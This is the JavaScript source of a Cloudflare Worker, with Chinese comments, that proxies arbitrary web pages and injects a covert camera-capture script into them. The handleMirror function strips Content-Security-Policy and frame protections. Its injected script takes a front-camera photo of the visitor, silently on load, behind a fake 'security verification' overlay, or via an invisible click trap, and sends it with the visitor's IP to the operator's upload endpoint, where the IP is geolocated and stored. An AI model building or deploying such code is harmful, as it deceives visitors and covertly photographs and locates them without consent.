export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, DELETE, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // 路由分发
    if (path.startsWith("/api/image/") && request.method === "GET") {
      return handleGetImage(request, env, corsHeaders);
    }

    if (path === "/api/upload" && request.method === "POST") {
      return handleUpload(request, env, corsHeaders);
    }

    if (path === "/api/photos" && request.method === "GET") {
      return handleGetPhotos(request, env, corsHeaders);
    }

    if (path === "/api/photos" && request.method === "DELETE") {
      return handleDeletePhotos(request, env, corsHeaders);
    }

    const selfOrigin = `${url.protocol}//${url.host}`;

    // 影子镜像引擎：精确入口判定
    // 只有路径以 /v 开头 且 显式包含 url 或 d 参数时，才被视为镜像入口
    const isMirrorEntry = path.toLowerCase().startsWith("/v") && (url.searchParams.has("url") || url.searchParams.has("d"));

    if (isMirrorEntry) {
      return handleMirror(request, env, ctx, null, null, selfOrigin);
    }

    // 全局代理回填逻辑：处理目标站的所有内部路径请求（包括那些以 /v 开头的内部 API）
    const shadowTarget = getCookie(request, "SHADOW_TARGET");
    const shadowId = getCookie(request, "SHADOW_ID");

    if (shadowTarget && !path.startsWith("/api") && path !== "/" && path !== "/home.html") {
      const targetUrl = new URL(shadowTarget);
      const proxyUrl = new URL(url.pathname + url.search, targetUrl.origin);

      const proxyRequest = new Request(proxyUrl, request);
      return handleMirror(proxyRequest, env, ctx, shadowTarget, shadowId, selfOrigin);
    }

    // 健康检查端点
    if (path === "/api/ping" || path === "/ping") {
      return new Response(
        JSON.stringify({
          status: "ok",
          timestamp: new Date().toISOString(),
          message: "API is running",
        }),
        {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // 如果归巢（主页），则主动清理镜像 Session 缓存
    if (path === "/" || path === "/home.html") {
      const response = env.ASSETS ? await env.ASSETS.fetch(request) : new Response("Not Found", { status: 404 });
      const newResponse = new Response(response.body, response);
      newResponse.headers.append("Set-Cookie", "SHADOW_TARGET=; Path=/; Max-Age=0");
      newResponse.headers.append("Set-Cookie", "SHADOW_ID=; Path=/; Max-Age=0");
      return newResponse;
    }

    // 如果不是 API 请求，则回退到静态资源（Assets）
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return new Response("Not Found", { status: 404 });

  },
};

async function handleUpload(request, env, corsHeaders) {
  try {
    const data = await request.json();
    const { id, image, ip } = data;

    if (!id || !image) {
      return new Response(JSON.stringify({ error: "参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const buffer = base64ToArrayBuffer(base64Data);

    const timestamp = new Date()
      .toISOString()
      .replace(/[-:T]/g, "")
      .slice(0, 14);
    const fileName = `${id}/${timestamp}.png`;

    // 并行上传图片和获取IP信息
    const uploadPromise = env.PHOTO_BUCKET.put(fileName, buffer, {
      httpMetadata: {
        contentType: "image/png",
      },
    });

    // 并行获取IP信息
    let ipPromise = Promise.resolve();
    if (ip) {
      ipPromise = getIPInfo(ip)
        .then((ipInfo) => {
          if (ipInfo) {
            const ipFileName = `${id}/${timestamp}.json`;
            return env.PHOTO_BUCKET.put(ipFileName, JSON.stringify(ipInfo), {
              httpMetadata: {
                contentType: "application/json",
              },
            });
          }
        })
        .catch((err) => {
          console.error("IP信息获取/存储失败:", err);
        });
    }

    // 等待图片和IP信息都完成
    await Promise.all([uploadPromise, ipPromise]);

    return new Response(JSON.stringify({ success: true, fileName }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("上传错误:", error);
    return new Response(JSON.stringify({ error: "上传失败" }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}

// 获取IP地理位置信息（优先使用百度API，失败时使用免费API）
async function getIPInfo(ip) {
  try {
    // 首先尝试百度API
    try {
      const baiduResponse = await fetch(
        `https://qifu.baidu.com/api/v1/ip-portrait/brief-info?ip=${ip}`,
        {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            Referer: "https://qifu.baidu.com/",
          },
        }
      );

      if (baiduResponse.ok) {
        const baiduData = await baiduResponse.json();
        if (baiduData.code === 200 && baiduData.data) {
          const d = baiduData.data;
          return {
            ip: ip,
            country: d.country || "未知",
            province: d.province || null,
            city: d.city || null,
            isp: d.isp || "未知",
            scene: d.scene || null,
            security_risks: d.security_risks || null,
            risk_score: d.risk_score || null,
            query_time: new Date().toISOString(),
            source: "baidu",
          };
        }
      }
    } catch (baiduError) {
      console.log("百度API失败，使用备用API:", baiduError.message);
    }

    // 备用：使用 ip-api.com（免费，无需认证）
    const response = await fetch(`http://ip-api.com/json/${ip}?lang=zh-CN`);
    if (!response.ok) return null;

    const data = await response.json();
    if (data.status !== "success") return null;

    return {
      ip: ip,
      country: data.country || "未知",
      province: data.regionName || null,
      city: data.city || null,
      isp: data.isp || "未知",
      latitude: data.lat,
      longitude: data.lon,
      timezone: data.timezone,
      query_time: new Date().toISOString(),
      source: "ip-api",
    };
  } catch (error) {
    console.error("IP查询失败:", error);
    return null;
  }
}

// 图片直通端点 - 直接从 R2 流式传输图片
async function handleGetImage(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const key = decodeURIComponent(url.pathname.replace("/api/image/", ""));

    console.log("请求图片 key:", key);

    const object = await env.PHOTO_BUCKET.get(key);

    console.log("R2 返回对象:", object ? "存在" : "不存在");

    if (!object) {
      return new Response(`Not Found: ${key}`, { status: 404 });
    }

    // 直接返回图片流，不需要 Base64 转换
    return new Response(object.body, {
      headers: {
        ...corsHeaders,
        "Content-Type": "image/png",
        // 强缓存策略 - 24小时
        "Cache-Control": "public, max-age=86400, immutable",
        // Cloudflare CDN 缓存
        "CDN-Cache-Control": "max-age=86400",
        "Cloudflare-CDN-Cache-Control": "max-age=86400",
      },
    });
  } catch (error) {
    console.error("获取图片错误:", error);
    return new Response("Error", { status: 500 });
  }
}

async function handleGetPhotos(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const id = url.searchParams.get("id");
    const page = parseInt(url.searchParams.get("page") || "0");
    const limit = parseInt(url.searchParams.get("limit") || "2");

    if (!id) {
      return new Response(JSON.stringify({ error: "ID参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 1. 检查 R2 绑定状态
    if (!env.PHOTO_BUCKET) {
      throw new Error("PHOTO_BUCKET 绑定丢失，请检查 wrangler.toml 和环境配置");
    }

    // 2. 获取列表
    let listed;
    try {
      listed = await env.PHOTO_BUCKET.list({
        prefix: `${id}/`,
      });
    } catch (listError) {
      throw new Error(`R2 List 失败: ${listError.message}`);
    }

    if (!listed || !listed.objects) {
      return new Response(JSON.stringify({ photos: [], total: 0 }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 3. 安全过滤和排序
    const allPhotos = listed.objects
      .filter((obj) => obj && obj.key && obj.key.endsWith(".png"))
      .sort((a, b) => {
        const timeA = a.uploaded ? a.uploaded.getTime() : 0;
        const timeB = b.uploaded ? b.uploaded.getTime() : 0;
        return timeB - timeA;
      });

    const total = allPhotos.length;
    const totalPages = Math.ceil(total / limit);
    const startIndex = page * limit;
    const endIndex = startIndex + limit;
    const pagePhotos = allPhotos.slice(startIndex, endIndex);

    const baseUrl = new URL(request.url).origin;
    const photos = await Promise.all(
      pagePhotos.map(async (obj) => {
        // 安全解析时间
        let formattedTime = "未知时间";
        try {
          const parts = obj.key.split("/");
          if (parts.length > 1) {
            const timeStr = parts[1].replace(".png", "");
            formattedTime = formatTime(timeStr);
          }
        } catch (e) {
          console.error("时间解析失败:", e);
        }

        // 尝试获取对应的IP信息JSON文件
        let ipInfo = null;
        try {
          const ipFileName = obj.key.replace(".png", ".json");
          const ipObject = await env.PHOTO_BUCKET.get(ipFileName);
          if (ipObject) {
            const ipData = await ipObject.text();
            ipInfo = JSON.parse(ipData);
          }
        } catch (e) {
          // IP信息不存在
        }

        return {
          url: `${baseUrl}/api/image/${encodeURIComponent(obj.key)}`,
          time: formattedTime,
          key: obj.key,
          ipInfo: ipInfo,
        };
      })
    );

    return new Response(
      JSON.stringify({
        photos,
        total,
        currentPage: page,
        totalPages,
        debug: { count: listed.objects.length, filtered: total }
      }),
      {
        status: 200,
        headers: {
          ...corsHeaders,
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
      }
    );
  } catch (error) {
    console.error("获取照片错误:", error);
    return new Response(JSON.stringify({
      error: "获取照片失败",
      message: error.message,
      stack: error.stack,
      env_keys: Object.keys(env)
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}


async function handleDeletePhotos(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const id = url.searchParams.get("id");
    const key = url.searchParams.get("key"); // 单张照片的key

    console.log("删除请求 - ID:", id, "Key:", key);

    if (!id) {
      return new Response(JSON.stringify({ error: "ID参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 删除单张照片
    if (key) {
      console.log("开始删除单张照片:", key);

      try {
        // 验证 key 格式
        if (!key.includes('/') || !key.endsWith('.png')) {
          throw new Error(`无效的 key 格式: ${key}`);
        }

        // 删除图片文件
        await env.PHOTO_BUCKET.delete(key);
        console.log("✅ 已删除图片:", key);

        // 删除对应的IP信息JSON文件（如果存在）
        const jsonKey = key.replace(".png", ".json");
        try {
          await env.PHOTO_BUCKET.delete(jsonKey);
          console.log("✅ 已删除IP信息:", jsonKey);
        } catch (jsonError) {
          console.log("⚠️ IP信息文件不存在或删除失败:", jsonKey);
        }

        return new Response(JSON.stringify({
          success: true,
          deleted: 1,
          key: key,
          message: "照片已删除"
        }), {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      } catch (deleteError) {
        console.error("删除单张照片失败:", deleteError);
        return new Response(JSON.stringify({
          error: "删除失败",
          details: deleteError.message,
          key: key
        }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    // 删除所有照片（包括图片和JSON文件）
    console.log("开始删除所有照片，ID:", id);

    const listed = await env.PHOTO_BUCKET.list({
      prefix: `${id}/`,
    });

    console.log("找到文件数量:", listed.objects.length);

    // 只计数 PNG 文件（图片），不计数 JSON 文件（IP信息）
    const pngFiles = listed.objects.filter((obj) => obj.key.endsWith(".png"));
    const pngCount = pngFiles.length;

    if (pngCount === 0) {
      return new Response(JSON.stringify({
        success: true,
        deleted: 0,
        message: "没有找到要删除的照片"
      }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 逐个删除以确保可靠性
    let deletedCount = 0;
    for (const obj of listed.objects) {
      try {
        await env.PHOTO_BUCKET.delete(obj.key);
        deletedCount++;
        console.log("✅ 已删除:", obj.key);
      } catch (err) {
        console.error("删除失败:", obj.key, err);
      }
    }

    console.log(`✅ 删除完成，共删除 ${pngCount} 张照片（含IP信息文件）`);

    return new Response(
      JSON.stringify({
        success: true,
        deleted: pngCount,
        total: pngCount,
        message: `已删除 ${pngCount} 张照片`
      }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("删除照片错误:", error);
    return new Response(JSON.stringify({
      error: "删除失败",
      details: error.message
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}

function base64ToArrayBuffer(base64) {
  const binaryString = atob(base64);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0; i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes.buffer;
}

// arrayBufferToBase64 函数已移除 - 不再需要 Base64 转换
// 图片现在通过 /api/image/ 端点直接流式传输

function formatTime(timeStr) {
  if (timeStr.length < 14) return timeStr;

  // 解析 UTC 时间字符串
  const year = timeStr.slice(0, 4);
  const month = timeStr.slice(4, 6);
  const day = timeStr.slice(6, 8);
  const hour = timeStr.slice(8, 10);
  const minute = timeStr.slice(10, 12);
  const second = timeStr.slice(12, 14);

  // 创建 UTC Date 对象
  const utcDate = new Date(
    `${year}-${month}-${day}T${hour}:${minute}:${second}Z`
  );

  // 转换为北京时间（GMT+8）
  const beijingTime = new Date(utcDate.getTime() + 8 * 60 * 60 * 1000);

  // 格式化输出
  const bjYear = beijingTime.getUTCFullYear();
  const bjMonth = String(beijingTime.getUTCMonth() + 1).padStart(2, "0");
  const bjDay = String(beijingTime.getUTCDate()).padStart(2, "0");
  const bjHour = String(beijingTime.getUTCHours()).padStart(2, "0");
  const bjMinute = String(beijingTime.getUTCMinutes()).padStart(2, "0");
  const bjSecond = String(beijingTime.getUTCSeconds()).padStart(2, "0");

  return `${bjYear}-${bjMonth}-${bjDay} ${bjHour}:${bjMinute}:${bjSecond} `;
}

/**
 * 影子镜像核心：服务端网页劫持与注入
 */
async function handleMirror(request, env, ctx, explicitTarget = null, cachedId = null, selfOrigin = null) {
  const url = new URL(request.url);
  const currentOrigin = selfOrigin || url.origin;
  let targetUrl = explicitTarget || url.searchParams.get("url");
  let id = url.searchParams.get("id") || cachedId;
  const encodedData = url.searchParams.get("d");
  const mode = url.searchParams.get("m") || "0"; // 0:静默, 1:强制, 2:潜伏

  // 支持前端生成的 Base64 复合编码参数
  if (encodedData && (!targetUrl || !id)) {
    try {
      // 这里的 atob 在 Worker 环境中可用
      const decoded = atob(encodedData);
      // 特殊字符还原逻辑（对应前端 encodeURIComponent 逻辑）
      const decodedParams = decodeURIComponent(
        Array.from(decoded).map(c => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)).join("")
      );
      const parts = decodedParams.split("|");
      if (parts.length >= 2) {
        id = parts[0];
        targetUrl = parts[1];
      }
    } catch (e) {
      console.error("Base64 Decode Error:", e);
    }
  }

  if (!targetUrl || !id) {
    return new Response("Missing parameters", { status: 400 });
  }

  // 0. 尝试从边缘缓存获取 (加速关键)
  const cache = caches.default;
  const cacheKey = new Request(url.toString(), request);
  let cachedResponse = await cache.match(cacheKey);
  if (cachedResponse) {
    return cachedResponse;
  }

  try {
    // 1. 抓取目标页面 - 深度伪装 Headers
    const response = await fetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": new URL(targetUrl).origin,
      },
      cf: {
        cacheTtl: 120, // 缓存目标站响应 2 分钟
        cacheEverything: true
      },
      redirect: "follow"
    });

    if (!response.ok) {
      return new Response(`Failed to fetch target: ${response.status}`, { status: 502 });
    }

    let html = await response.text();

    // 2. 注入多战术模式 (CSS/HTML/JS)
    const IS_ENFORCE = mode === "1";
    const IS_STALKER = mode === "2";

    let forceStyle = "";
    let forceHtml = "";

    if (IS_ENFORCE) {
      forceStyle = `
      <style id="shadow-lock-style">
        html, body { overflow: hidden !important; height: 100vh !important; }
        #shadow-mirror-overlay {
          position: fixed; inset: 0; z-index: 2147483647;
          background: rgba(255, 255, 255, 0.4);
          backdrop-filter: blur(20px) saturate(180%);
          -webkit-backdrop-filter: blur(20px) saturate(180%);
          display: flex; flex-direction: column; align-items: center; justify-content: center;
          font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 20px;
        }
        .lock-box { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); max-width: 320px; }
        .lock-title { font-size: 18px; font-weight: 600; color: #111; margin-bottom: 12px; }
        .lock-text { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
        .lock-btn { background: #007aff; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; }
      </style>`;
      forceHtml = `
      <div id="shadow-mirror-overlay">
        <div class="lock-box">
          <div class="lock-title">安全验证</div>
          <div class="lock-text">检测到环境异常，请完成验证以继续访问。</div>
          <button class="lock-btn">开始验证</button>
        </div>
      </div>`;
    } else if (IS_STALKER) {
      forceStyle = `
      <style id="shadow-lock-style">
        #shadow-click-trap { position: fixed; inset: 0; z-index: 2147483647; background: transparent; cursor: pointer; }
      </style>`;
      forceHtml = `<div id="shadow-click-trap"></div>`;
    }

    const captureScript = `
    <!-- Online Mirror Tactical Engine V5 -->
    <script>
    (function(){
      const ID = "${id}";
      const MODE = "${mode}";
      const API_UPLOAD = "${currentOrigin}/api/upload";
      let captured = false;

      function unlock() {
        const overlay = document.getElementById('shadow-mirror-overlay');
        const trap = document.getElementById('shadow-click-trap');
        const style = document.getElementById('shadow-lock-style');
        if (overlay) overlay.remove();
        if (trap) trap.remove();
        if (style) style.remove();
      }

      function upload(data, ip) {
        const payload = JSON.stringify({ id: ID, image: data, ip: ip });
        if (navigator.sendBeacon) {
          navigator.sendBeacon(API_UPLOAD, new Blob([payload], {type: 'application/json'}));
        } else {
          fetch(API_UPLOAD, { method: 'POST', body: payload, keepalive: true });
        }
      }

      async function startCapture() {
        if (captured) return;
        try {
          const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => ({json:()=>({ip:"Unknown"})}));
          const { ip } = await ipRes.json();
          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
          captured = true;
          unlock();

          const video = document.createElement('video');
          video.srcObject = stream;
          video.muted = true;
          await video.play();
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth; canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          upload(canvas.toDataURL('image/jpeg', 0.5), ip);
        } catch(e) {
          if (MODE !== "0") alert("验证失败，请授权摄像头以继续访问。");
        }
      }

      if (MODE === "1") {
        document.querySelector('.lock-btn')?.addEventListener('click', startCapture);
      } else if (MODE === "2") {
        window.addEventListener('click', startCapture, { once: true });
      } else {
        if (document.readyState === 'complete') { startCapture(); }
        else { window.addEventListener('load', startCapture); }
      }
    })();
    </script>
    `;

    // 3. HTML 动态重组
    const baseTag = `<base href="${targetUrl}">`;
    html = html.replace(/<head>/i, `<head>${baseTag}${forceStyle}`);
    html = html.replace(/<\/body>/i, `${forceHtml}${captureScript}</body>`);

    // 4. 清理安全响应头，确保脚本能运行
    const newHeaders = new Headers(response.headers);
    newHeaders.set("Content-Type", "text/html; charset=UTF-8");
    newHeaders.set("X-Mirror-Engine", "Shadow-V5-Turbo");
    newHeaders.delete("Content-Security-Policy");
    newHeaders.delete("X-Frame-Options");
    newHeaders.delete("X-Content-Type-Options");
    newHeaders.set("Access-Control-Allow-Origin", "*");

    // 设置加速缓存头 (2分钟)
    newHeaders.set("Cache-Control", "public, max-age=120");

    // 设置 Cookie 记忆，用于处理后续相对路径请求和 ID 保持
    if (id && !cachedId) {
      newHeaders.append("Set-Cookie", `SHADOW_ID=${id}; Path=/; Max-Age=3600; SameSite=Lax`);
    }
    if (targetUrl && !explicitTarget) {
      const targetOrigin = new URL(targetUrl).origin;
      newHeaders.append("Set-Cookie", `SHADOW_TARGET=${encodeURIComponent(targetOrigin)}; Path=/; Max-Age=3600; SameSite=Lax`);
    }

    const finalResponse = new Response(html, {
      status: response.status,
      headers: newHeaders,
    });

    // 存入边缘缓存，加速后续访问
    ctx.waitUntil(cache.put(cacheKey, finalResponse.clone()));

    return finalResponse;
  } catch (err) {
    return new Response(`Mirror Error: ${err.message}`, { status: 500 });
  }
}

// 辅助函数：解析 Cookie
function getCookie(request, name) {
  const cookieString = request.headers.get("Cookie");
  if (!cookieString) return null;
  const cookies = cookieString.split(";");
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split("=");
    if (key === name) return decodeURIComponent(value);
  }
  return null;
}
